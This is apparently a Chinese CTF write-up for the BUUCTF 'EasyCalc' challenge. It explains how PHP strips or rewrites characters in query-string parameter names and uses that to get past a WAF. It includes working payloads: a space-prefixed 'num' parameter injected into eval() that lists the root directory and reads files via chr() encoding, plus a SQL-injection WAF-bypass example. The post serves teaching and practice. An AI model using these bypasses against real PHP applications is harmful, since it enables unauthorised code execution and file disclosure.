---
title: BUUCTF-EasyCalc
date: 2021-10-28 22:41:39
updated: 2021-10-28 22:41:39
tags: [php相关]
categories: BUUCTF
toc: true
---

**知识点：PHP字符串解析特性**

<!-- more -->

------

查看题目和源代码：

![](https://i.loli.net/2021/10/28/XEqmdlrLV2nxBZp.png)

![](https://i.loli.net/2021/10/28/bxqN349Ovky6cAY.png)

可以看到一个**新页面**和设置了WAF

打开新页面，发现了`eval()`函数，应该就是注入点

![](https://i.loli.net/2021/10/28/c8ZuJynMbHtLkaR.png)

尝试构造命令：phpinfo()，**发现应该另一个WAF给过滤了**。

![](https://i.loli.net/2021/10/28/8AsJNnCSZgaWyvK.png)

> tips: 并不是说题目是php写的，waf也是用php写的，源码中的过滤应该只是其中一个waf

### PHP的字符串解析特性

PHP将查询字符串（在URL或正文中）转换为内部关联数组\$\_GET或关联数组\$\_POST。

例如：`/?foo=bar` 变成 `Array([foo] => “bar”)`

值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。

例如: `/?%20news[id%00=42` 会转换为 `Array([news_id] => 42)`。

如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：
/news.php?%20news[id%00=42"+AND+1=0–

上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。
PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：

- <font color='red'>删除前后的空白符（空格符，制表符，换行符等统称为空白符）</font>
- <font color='red'>将某些字符转换为下划线（包括空格）</font>

例如：

| User input    | Decoded PHP | variable name |
| ------------- | ----------- | :-----------: |
| %20foo_bar%00 | foo_bar     |    foo_bar    |
| foo%20bar%00  | foo bar     |    foo_bar    |
| foo%5bbar     | foo[bar     |    foo_bar    |

所以此题中：`?num=aaaa`显示非法输入的话，改成`? num=aaaa`，在num前增加一个空格。

这样：**waf就无法找到num这个变量了，因为现在的变量叫" num"，而不是"num"。**

**但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。**

所以依次构造payload:

题目中过滤了部分特殊符号，可以用`chr()`绕过

```php+HTML
calc.php? num=print_r(scandir(chr(47)))
```

![](https://i.loli.net/2021/10/29/Wuy3RzCOZJXpxtc.png)

```php+HTML
calc.php? num=var_dump(file_get_contents(chr(47).f1agg))
```

![](https://i.loli.net/2021/10/29/DktT6H7aJRPqU4n.png)

解法二：HTTP走私，详见另一篇博客：



